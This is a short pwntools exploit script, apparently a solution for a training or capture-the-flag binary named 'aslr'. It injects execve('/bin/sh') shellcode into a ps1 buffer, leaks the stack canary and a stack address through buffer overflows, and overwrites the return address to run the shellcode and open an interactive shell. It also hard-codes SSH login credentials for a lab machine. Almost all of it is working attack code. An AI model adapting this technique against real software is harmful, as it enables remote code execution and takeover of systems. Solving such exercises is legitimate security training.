from pwn import *

if "REMOTE" not in args:
    ssh = ssh("buba98", "127.0.0.1", password="Vinsent22!", port=2222)
    r = ssh.process("aslr")
    gdb.attach(r, """
        b *0x555555755080
        # c
        """)

    input("wait")
else:
    r = remote("bin.training.jinblack.it", 2012)

# got is at  0x301000 and is executable +0x1000
# ps1 is at  0x301080 and seams to be executable?
# main is at 0x100960

input("Fill ps1")

ps1_peyload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x90\x90\x90"
r.send(ps1_peyload)

input("Leak canary")

payload = b"B" * (104 + 1)
r.send(payload)
r.recvuntil(b"> ")
r.recv(105)

canary = u64(b"\x00" + r.recv(7))
print("Canary: %#x" % canary)

input("Leak address near ps1")

rbp = 0x555555554ac0
ps1 = 0x555555755080

delta = abs(rbp - ps1)

print("Delta : %#x" % delta)

payload = b"D" * (104 + 8)
r.send(payload)
r.recvuntil(b"> ")
r.recv(104 + 8)

recieved = r.recv(6)

print("Recieved %#x" % u64(recieved + b"\x00\x00"))

near_ps1 = u64(recieved + b"\x00\x00")
print("Near ps1: %#x" % near_ps1)

input("Rebuild canary and override return address")

ps1_leaked = near_ps1 + delta
print("Ps1 : %#x" % ps1_leaked)

payload = b"C" * 104 + p64(canary) + p64(near_ps1) + p64(ps1_leaked)
r.send(payload)

input("Some Men Just Want To Watch The World Burn")

r.interactive()
